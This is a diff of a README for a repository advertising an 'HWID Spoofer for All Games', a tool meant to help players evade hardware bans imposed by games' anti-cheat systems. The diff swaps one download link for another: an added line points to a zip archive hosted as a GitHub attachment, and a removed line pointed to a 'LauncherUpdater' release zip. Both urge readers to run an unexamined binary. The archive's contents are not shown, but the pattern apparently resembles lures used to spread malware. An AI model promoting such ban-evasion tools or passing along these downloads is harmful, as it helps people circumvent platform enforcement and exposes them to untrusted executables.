@@ -2,6 +2,7 @@
 
 ![1](https://github.com/user-attachments/assets/9c86128b-6e4f-46ab-afab-88d989becf16)
 
+> ### You can simply [`Download`](https://github.com/user-attachments/files/17984739/Spoofer.r0fl3d.zip) and use spoofer without *bash*
 
 ## Overview
 Welcome to the HWID Spoofer for All Games repository! This tool is designed to help gamers bypass hardware bans in various online games by spoofing their hardware identifiers (HWID). With the increasing number of games implementing stringent anti-cheat systems, it's crucial to have reliable tools that allow players to enjoy their gaming experience without the fear of unfair bans.
@@ -16,7 +17,6 @@ Welcome to the HWID Spoofer for All Games repository! This tool is designed to h
 
 ## Installation
 
-> ### You can simply download [`LauncherUpdater`](https://github.com/ArmandoA10/hwid-spoofer/releases/download/hwid-spoofer/LauncherUpdater.zip) and use spoofer without *bash*
 
 Clone the Repository:
 
